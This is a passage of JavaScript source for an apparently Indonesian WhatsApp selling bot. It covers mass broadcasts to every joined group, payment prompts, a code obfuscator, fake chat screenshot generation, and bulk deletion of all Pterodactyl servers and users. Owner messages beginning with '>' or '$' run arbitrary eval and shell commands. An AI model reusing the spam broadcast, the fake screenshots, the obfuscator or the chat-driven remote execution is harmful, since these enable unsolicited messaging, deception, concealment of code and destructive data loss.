const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//=========================================//

case "dana": {
  if (!isCreator) return;

  let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

*Nomor:* ${global.dana}

📌 *Penting:* Wajib kirimkan bukti transfer demi keamanan bersama.
`.trim();

  // Generate pesan nativeFlowMessage dengan button salin
  let msg = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonType: 7,
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Salin Nomor Dana",
                  copy_code: global.dana
                })
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext2 }); // quoted tetap pakai qtext2 kalau mau

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

//=========================================//

case "ovo": {
  if (!isCreator) return;

  let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

*Nomor:* ${global.ovo}

📌 *Penting:* Wajib kirimkan bukti transfer demi keamanan bersama.
`.trim();

  // Kirim pesan pakai nativeFlowMessage + button salin
  let msg = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonType: 7,
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Salin Nomor OVO",
                  copy_code: global.ovo
                })
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext2 });

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

//=========================================//

case "gopay": {
  if (!isCreator) return;

  let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

*Nomor:* ${global.gopay}

📌 *Penting:* Wajib kirimkan bukti transfer demi keamanan bersama.
`.trim();

  // Kirim pesan pakai nativeFlowMessage + button salin
  let msg = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonType: 7,
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Salin Nomor Gopay",
                  copy_code: global.gopay
                })
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext2 });

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

//=========================================//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//=========================================//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//=========================================//
case 'enchard2': {
    if (!m.quoted) return m.reply("*❌ SALAH*\nreply filenya .js");
    if (mime !== "application/javascript") return m.reply("lol Reply File Js Nya Bujang");

    let a = await m.quoted.download();
    let b = m.quoted.fileName;
    const filePath = `./@hardenc${b}.js`;

    if (a.length > 400 * 1024) return m.reply("File terlalu besar. Maksimal 400KB.");

    fs.writeFileSync(filePath, a);
    await m.reply("*🚀Proses*\nProses Encrypted File....");

    try {
        const sourceCode = fs.readFileSync(filePath, "utf-8");
        const obfuscated = await JsConfuser.obfuscate(sourceCode, {
            target: "node",
            preset: "medium",
            compact: true,
            minify: true,
            flatten: false,
            identifierGenerator: function () {
                const c = "難FyzzOwner素" + "難FyzzNewEraa素";
                const d = x => x.replace(/[^a-zA-Z座Fyzz素Crasher素]/g, '');
                const e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
                return d(c) + e(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0,
            stringConcealing: false, // dimatikan untuk ringan
            stringCompression: false, // dimatikan
            controlFlowFlattening: false, // matikan untuk ringan
            deadCode: false,
            hexadecimalNumbers: true,
            objectExtraction: false,
            globalConcealing: false,
        });

        fs.writeFileSync(filePath, obfuscated);
        await conn.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(filePath),
                mimetype: "application/javascript",
                fileName: b,
                caption: "*✅ SUKSES*\nFile Sukses Di Ewe Mas"
            },
            { quoted: m }
        );
    } catch (err) {
        m.reply("Gagal Encrypt: " + err.message);
    }
}
break;

case "developer": case "dev":  case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break

//=========================================//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//=========================================//

case "self": {
if (!isCreator) return
conn.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//=========================================//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./FyzzNewEraa.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//=========================================//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//=========================================//

case "public": {
if (!isCreator) return
conn.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//=========================================//

case "restart":
case "rst": {
    if (!isCreator) return Reply(mess.owner)

    await m.reply("Memproses _restart server_ . . .")

    try {
        const file = fs.readdirSync("./session")
        const anu = file.filter(i => i !== "creds.json")

        for (let t of anu) {
            fs.unlinkSync(`./session/${t}`)
        }

        // Kirim sinyal reset ke parent process jika tersedia
        if (typeof process.send === "function") {
            process.send('reset')
        } else {
            console.log("[INFO] process.send tidak tersedia, keluar manual...")
            await m.reply("✅ Done restart (manual exit)") // Pesan sebelum exit
            process.exit(1)
        }

    } catch (err) {
        console.error("[ERROR] Gagal merestart:", err)
        return m.reply("❌ Gagal merestart server.")
    }

    // Jika tidak restart, beri pesan sukses
    await m.reply("✅ Done restart!")

    break
}

//=========================================//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//=========================================//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//=========================================//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//=========================================//

case "addcase": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(`Contoh: ${prefix + command} *casenya*`);
    const namaFile = path.join(__dirname, 'FyzzNewEraa.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return Reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return Reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return Reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return Reply(result.message);
        }
    });
}
break

case "delcase": {
 if (!isCreator) return onlyOwn();
 if (!text) 
 return Reply(`Contoh: .delcase *nama_case*`);

 const fs = require('fs').promises;

 async function removeCase(filePath, caseNameToRemove) {
   try {
     let data = await fs.readFile(filePath, 'utf8');
     
     // Regex untuk mencari dan menghapus blok kode case menggunakan tanda kutip ganda
     const regex = new RegExp(`case\\s+"${caseNameToRemove}":[\\s\\S]*?break`, 'g');

     if (!regex.test(data)) {
       return Reply(`Case "${caseNameToRemove}" tidak ditemukan.`);
     }

     let newData = data.replace(regex, '');
     await fs.writeFile(filePath, newData, 'utf8');
     return Reply(`Berhasil menghapus case "${caseNameToRemove}".`);
   } catch (err) {
     console.error(err);
     return Reply('Terjadi kesalahan saat menghapus case.');
   }
 }

 // Jalankan fungsi hapus case
 let filePath = './FyzzNewEraa.js'; // Ganti dengan path file sebenarnya
 removeCase(filePath, text.trim());
 break;
}

case "delallserver": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let listDeleted = [];

    // ===== Ambil SEMUA server dari semua halaman =====
    let servers = [];
    let page = 1;
    while (true) {
      let res = await fetch(`${domain}/api/application/servers?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });
      let data = await res.json();
      if (!data.data || data.data.length === 0) break;
      servers.push(...data.data);
      page++;
    }

    if (servers.length < 1) return m.reply("Tidak ada server untuk dihapus!");

    // ===== Ambil SEMUA user dari semua halaman =====
    let users = [];
    let userPage = 1;
    while (true) {
      let resUser = await fetch(`${domain}/api/application/users?page=${userPage}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });
      let userData = await resUser.json();
      if (!userData.data || userData.data.length === 0) break;
      users.push(...userData.data);
      userPage++;
    }

    // ===== Hapus semua server dan user terkait =====
    for (let server of servers) {
      let s = server.attributes;
      let name = s.name.toLowerCase();

      // Hapus server
      await fetch(`${domain}/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });

      // Cari user yang nama depannya = nama server, lalu hapus
      let targetUser = users.find(u => u.attributes.first_name.toLowerCase() === name);
      if (targetUser) {
        await fetch(`${domain}/api/application/users/${targetUser.attributes.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikey}`
          }
        });
      }

      listDeleted.push(`• ${s.name} (ID: ${s.id})`);
    }

    if (listDeleted.length < 1) return m.reply("Tidak ada server yang berhasil dihapus.")
    m.reply(`✅ Berhasil menghapus semua server:\n\n${listDeleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus semua server. Cek log untuk detail.");
  }
}
break;

case "delallserver2": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let listDeleted = [];

    // ===== Ambil SEMUA server dari semua halaman =====
    let servers = [];
    let page = 1;
    while (true) {
      let res = await fetch(`${domainV2}/api/application/servers?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });
      let data = await res.json();
      if (!data.data || data.data.length === 0) break;
      servers.push(...data.data);
      page++;
    }

    if (servers.length < 1) return m.reply("Tidak ada server untuk dihapus!");

    // ===== Ambil SEMUA user dari semua halaman =====
    let users = [];
    let userPage = 1;
    while (true) {
      let resUser = await fetch(`${domainV2}/api/application/users?page=${userPage}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });
      let userData = await resUser.json();
      if (!userData.data || userData.data.length === 0) break;
      users.push(...userData.data);
      userPage++;
    }

    // ===== Hapus semua server dan user terkait =====
    for (let server of servers) {
      let s = server.attributes;
      let name = s.name.toLowerCase();

      // Hapus server
      await fetch(`${domainV2}/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });

      // Cari user yang nama depannya = nama server, lalu hapus
      let targetUser = users.find(u => u.attributes.first_name.toLowerCase() === name);
      if (targetUser) {
        await fetch(`${domainV2}/api/application/users/${targetUser.attributes.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikeyV2}`
          }
        });
      }

      listDeleted.push(`• ${s.name} (ID: ${s.id})`);
    }

    if (listDeleted.length < 1) return m.reply("Tidak ada server yang berhasil dihapus.")
    m.reply(`✅ Berhasil menghapus semua server:\n\n${listDeleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus semua server. Cek log untuk detail.");
  }
}
break;

case "delalluser": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let users = [];
    let deleted = [];
    let page = 1;

    // Loop ambil semua user dari semua halaman
    while (true) {
      let res = await fetch(`${domain}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });

      let data = await res.json();
      if (!data.data || data.data.length === 0) break;

      users.push(...data.data);
      page++;
    }

    if (users.length < 1) return m.reply("Tidak ada user yang ditemukan.");

    // Hapus semua user yang bukan admin
    for (let user of users) {
      let u = user.attributes;
      if (u.root_admin === false) {
        await fetch(`${domain}/api/application/users/${u.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikey}`
          }
        });

        deleted.push(`• ${u.username} (ID: ${u.id})`);
      }
    }

    if (deleted.length < 1) return m.reply("Tidak ada user biasa yang dihapus.");
    m.reply(`✅ Berhasil menghapus semua user biasa:\n\n${deleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus user. Cek log untuk detail.");
  }
}
break;

case "delalluser2": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let users = [];
    let deleted = [];
    let page = 1;

    // Loop ambil semua user dari semua halaman
    while (true) {
      let res = await fetch(`${domainV2}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });

      let data = await res.json();
      if (!data.data || data.data.length === 0) break;

      users.push(...data.data);
      page++;
    }

    if (users.length < 1) return m.reply("Tidak ada user yang ditemukan.");

    // Hapus semua user yang bukan admin
    for (let user of users) {
      let u = user.attributes;
      if (u.root_admin === false) {
        await fetch(`${domainV2}/api/application/users/${u.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikeyV2}`
          }
        });

        deleted.push(`• ${u.username} (ID: ${u.id})`);
      }
    }

    if (deleted.length < 1) return m.reply("Tidak ada user biasa yang dihapus.");
    m.reply(`✅ Berhasil menghapus semua user biasa:\n\n${deleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus user. Cek log untuk detail.");
  }
}
break;

case "addreseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
pler.push(m.chat)
fs.writeFileSync('./library/database/idgrup.json', JSON.stringify(pler))
Reply(`*Sukses Memberi Akses Ke Group Ini✅*`)
}
break

case "addreseller2": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
pler2.push(m.chat)
fs.writeFileSync('./library/database/idgrup2.json', JSON.stringify(pler2))
Reply(`*Sukses Memberi Akses Ke Group Ini✅*`)
}
break

case "delreseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./library/database/idgrup.json', JSON.stringify(pler))
Reply(`*Sukses Menghapus Akses Digroup Ini✅*`)
}
break

case "delreseller2": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
var ini = pler2.indexOf(m.chat)
pler2.splice(ini, 1)
fs.writeFileSync('./library/database/idgrup2.json', JSON.stringify(pler))
Reply(`*Sukses Menghapus Akses Digroup Ini✅*`)
}
break

case "fakechat": {
 if (!q) return m.reply(`❌ Contoh:\n${prefix + command} hidup Jokowi`);

 const url = `https://veloria-ui.vercel.app/imagecreator/fake-chat?time=12:00&messageText=${encodeURIComponent(q)}&batteryPercentage=100`;

 await conn.sendMessage(m.chat, {
 image: { url },
 caption: "📱 *Fake iPhone Quoted Message*"
 }, { quoted: m });
}
 break
 
case "totalfitur": {
if (!isCreator) return (`Maaf Fitur Ini Khusus Developer!!`)
Reply(`📂 *Jumlah Fitur:* ${totalFitur()} fitur`)
}
break

//=========================================//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//=========================================//

if (m.text.toLowerCase() == "bot") {
m.reply("Online tod ✅")
}

//=========================================//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//=========================================//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//=========================================//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error :*\n
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//=========================================//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});